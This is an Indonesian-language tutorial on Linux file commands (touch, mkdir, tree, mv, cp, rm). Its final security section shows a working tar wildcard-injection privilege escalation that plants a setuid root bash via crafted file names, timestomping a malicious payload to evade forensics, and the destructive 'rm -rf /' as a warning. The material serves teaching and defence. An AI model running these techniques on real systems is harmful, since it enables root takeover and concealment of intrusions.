## 1. Linux vs Windows: Pengelolaan File

Perbedaan utama pengelolaan file di Linux dibanding Windows terletak pada cara aksesnya. Di Windows, kita biasanya memakai tools grafis seperti Explorer. Di Linux, terminal menawarkan alternatif yang jauh lebih kuat.

- Lebih cepat, cukup dengan beberapa perintah.
- Bisa memodifikasi file secara selektif memakai regex.
- Bisa menjalankan banyak perintah sekaligus.
- Bisa mengotomasi tugas batch editing pada banyak file secara bersamaan.

## 2. `touch`, membuat file kosong

`touch` dipakai untuk membuat file kosong baru. Jika file sudah ada, perintah ini hanya memperbarui timestamp-nya tanpa mengubah isinya.

```bash
# Syntax
touch <filename>

# Create a single file
$ touch info.txt

# Create multiple files at once
$ touch file1.txt file2.txt file3.txt

# Create a file inside a specific directory
$ touch ./Storage/local/user/userinfo.txt
```

Catatan: tanda `.` (satu titik) merujuk ke direktori saat ini (current directory). Memakai `./path/file` cara praktis untuk bekerja relatif terhadap lokasi saat ini tanpa mengetik path absolut penuh.

---

## 3. `mkdir`, membuat direktori

`mkdir` (make directory) dipakai untuk membuat direktori baru. Gunakan flag `-p` untuk membuat direktori bertingkat (nested) sekaligus. Tanpa `-p`, perintah akan gagal jika direktori parent belum ada.

```bash
# Syntax
mkdir <directory_name>

# Create a single directory
$ mkdir Storage

# Create nested directories in one command (-p = parents)
$ mkdir -p Storage/local/user/documents
```

| Flag | Fungsi |
|------|--------|
| `-p` | Buat direktori parent secara otomatis |
| `-v` | Tampilkan detail setiap direktori yang dibuat |
| `-m` | Set permission saat membuat |

---

## 4. `tree`, memvisualisasikan struktur direktori

`tree` menampilkan struktur direktori secara visual dalam bentuk pohon. Berguna untuk memverifikasi hasil pembuatan direktori bertingkat.

```bash
# View current directory structure
$ tree .

.
├── info.txt
└── Storage
    └── local
        └── user
            └── documents

4 directories, 1 file

# After creating more files
$ touch ./Storage/local/user/userinfo.txt
$ tree .

.
├── info.txt
└── Storage
    └── local
        └── user
            ├── documents
            └── userinfo.txt

4 directories, 2 files
```

## 5. `mv`, memindahkan dan mengganti nama file

`mv` (move) punya dua fungsi sekaligus: memindahkan file/direktori ke lokasi lain, dan mengganti nama file/direktori. Perintah yang sama dipakai untuk keduanya, bedanya hanya pada argumen yang diberikan.

```bash
# Syntax
mv <source> <destination>

# ── RENAME a file ──────────────────────────────────
$ mv info.txt information.txt

# ── MOVE a single file to a directory ──────────────
$ mv information.txt Storage/

# ── MOVE multiple files to a directory ─────────────
$ mv information.txt readme.txt Storage/

$ tree .
.
└── Storage
    ├── information.txt
    ├── local
    │   └── user
    │       ├── documents
    │       └── userinfo.txt
    └── readme.txt

4 directories, 3 files

# ── MOVE and RENAME at the same time ───────────────
$ mv Storage/readme.txt Storage/local/READ_ME.txt
```

Peringatan: `mv` akan menimpa (overwrite) file tujuan tanpa peringatan jika sudah ada file dengan nama yang sama. Gunakan `mv -i` (interactive) supaya muncul konfirmasi sebelum menimpa.

```bash
# Safe move with confirmation
$ mv -i info.txt Storage/
mv: overwrite 'Storage/info.txt'? y
```

## 6. `cp`, menyalin file dan direktori

`cp` (copy) dipakai untuk menyalin file atau direktori ke lokasi baru. File asli tetap ada di lokasi semula. Untuk menyalin direktori beserta seluruh isinya, gunakan flag `-r` (recursive).

```bash
# Syntax
cp <source> <destination>

# Copy a file to another directory
$ cp Storage/readme.txt Storage/local/

$ tree .
.
└── Storage
    ├── information.txt
    ├── local
    │   ├── readme.txt           ← copied here
    │   └── user
    │       ├── documents
    │       └── userinfo.txt
    └── readme.txt               ← original still here

4 directories, 4 files

# Copy entire directory (recursive)
$ cp -r Storage/ Storage_backup/

# Copy and preserve permissions/timestamps
$ cp -rp Storage/ Storage_backup/
```

| Flag | Fungsi |
|------|--------|
| `-r` | Salin direktori secara rekursif |
| `-p` | Pertahankan permission & timestamp |
| `-i` | Konfirmasi sebelum menimpa |
| `-v` | Tampilkan file yang disalin |

## 7. `rm`, menghapus file dan direktori

`rm` (remove) dipakai untuk menghapus file atau direktori. Hati-hati: di Linux tidak ada Recycle Bin. File yang dihapus dengan `rm` tidak bisa dikembalikan secara normal. Selalu gunakan dengan hati-hati, terutama dengan flag `-rf`.

```bash
# Delete a single file
$ rm info.txt

# Delete with confirmation prompt (-i = interactive)
$ rm -i info.txt
rm: remove regular file 'info.txt'? y

# Delete an empty directory
$ rmdir Storage/local/user/documents

# Delete a directory and ALL its contents (DANGEROUS!)
$ rm -r Storage/

# Force delete without any prompts (USE WITH EXTREME CAUTION)
$ rm -rf Storage/
```

| Flag | Fungsi |
|------|--------|
| `-r` | Hapus direktori secara rekursif |
| `-f` | Paksa hapus tanpa konfirmasi |
| `-i` | Konfirmasi sebelum hapus |
| `-v` | Tampilkan file yang dihapus |

Bahaya: `rm -rf /` atau `rm -rf /*` akan menghapus semua yang ada di sistem. Jangan pernah menjalankan perintah ini. Aksi ini tidak bisa dibatalkan dan akan menghancurkan seluruh filesystem.

## 8. Contoh Alur Kerja Lengkap

```bash
# 1. Create directory structure
$ mkdir -p Storage/local/user/documents

# 2. Create files
$ touch info.txt
$ touch ./Storage/local/user/userinfo.txt

# 3. Verify structure
$ tree .
.
├── info.txt
└── Storage
    └── local
        └── user
            ├── documents
            └── userinfo.txt

# 4. Rename a file
$ mv info.txt information.txt

# 5. Move files into Storage
$ touch readme.txt
$ mv information.txt readme.txt Storage/

# 6. Copy readme.txt to local/
$ cp Storage/readme.txt Storage/local/

# 7. Verify final structure
$ tree .
.
└── Storage
    ├── information.txt
    ├── local
    │   ├── readme.txt
    │   └── user
    │       ├── documents
    │       └── userinfo.txt
    └── readme.txt

# 8. Clean up: delete the entire Storage directory
$ rm -r Storage/
```

## 9. Tabel Ringkasan Perintah

| Perintah | Fungsi | Contoh |
|----------|--------|--------|
| `touch` | Buat file kosong | `touch file.txt` |
| `mkdir` | Buat direktori | `mkdir Storage` |
| `mkdir -p` | Buat nested direktori | `mkdir -p a/b/c` |
| `tree` | Tampilkan struktur | `tree .` |
| `mv` | Pindah / rename | `mv a.txt b.txt` |
| `cp` | Salin file | `cp a.txt dir/` |
| `cp -r` | Salin direktori | `cp -r dir1/ dir2/` |
| `rm` | Hapus file | `rm file.txt` |
| `rm -r` | Hapus direktori | `rm -r Storage/` |
| `rmdir` | Hapus dir kosong | `rmdir emptydir/` |

## 10. Catatan Keamanan: Wildcard Injection, Timestomping, dan Penghapusan Aman

Dalam penetration testing, forensik digital, dan administrasi sistem, tiga hal berikut penting untuk dipahami.

1. Unix wildcard injection (`*` exploit): ketika skrip otomatis atau admin menjalankan perintah seperti `tar -czf backup.tar.gz *` atau `chown user:user *` di direktori yang bisa ditulis (`/tmp` atau folder upload web), penyerang dapat membuat file dengan nama menyerupai flag perintah, misalnya `--checkpoint=1` dan `--checkpoint-action=exec=sh exploit.sh`, untuk mengeksekusi kode berbahaya dengan hak akses pemilik skrip.
2. Timestomping anti-forensik: perintah `touch -t YYYYMMDDhhmm.ss` atau `touch -r reference_file` bisa memodifikasi timestamp (access time dan modification time) file backdoor agar tersamar dan cocok dengan file sistem yang sah.
3. Penghapusan aman dengan `shred`: menghapus file dengan `rm` hanya menghapus pointer inode di filesystem. Data mentahnya tetap bisa dipulihkan dengan alat forensik seperti Autopsy atau TestDisk. Gunakan `shred -u -z -n 3 file.txt` untuk menimpa data biner berulang kali sebelum file dihapus.

```bash
# ── WILDCARD INJECTION DEMO (TAR ARBITRARY CODE EXECUTION) ───
$ echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' > /var/www/uploads/shell.sh
$ touch /var/www/uploads/--checkpoint=1
$ touch /var/www/uploads/--checkpoint-action=exec=sh\ shell.sh
# When root cron runs: tar -czf backup.tar.gz /var/www/uploads/*
# Root executes shell.sh!

# ── TIMESTOMPING ANTI-FORENSICS ──────────────────────────────
# Match timestamp of malicious payload to /bin/ls
$ touch -r /bin/ls malicious_payload.so
$ stat malicious_payload.so

# ── SECURE DELETION ──────────────────────────────────────────
# Overwrite 3 times with random data, add final zero pass, and remove
$ shred -u -z -n 3 sensitive_credentials.txt
```

## Cheatsheet Referensi Cepat

```bash
# Create
touch filename.txt                    # empty file
touch -r ref_file target.txt          # match timestamp
mkdir dirname                         # directory
mkdir -p parent/child/grandchild      # nested directories
touch ./parent/child/file.txt         # file in specific path

# View structure
tree .                                # current directory tree
tree /path/to/dir                     # specific directory tree

# Move / Rename
mv old.txt new.txt                    # rename
mv file.txt dir/                      # move to directory
mv file1 file2 dir/                   # move multiple files
mv -i file.txt dir/                   # safe move (confirm overwrite)

# Copy
cp file.txt dir/                      # copy file to directory
cp -r dir1/ dir2/                     # copy entire directory
cp -rp dir1/ dir2/                    # copy + preserve permissions

# Delete
rm file.txt                           # delete file
rm -i file.txt                        # delete with confirmation
rm -r dirname/                        # delete directory
rmdir emptydir/                       # delete empty directory only
shred -u -z -n 3 secret.txt           # secure data wipe
```
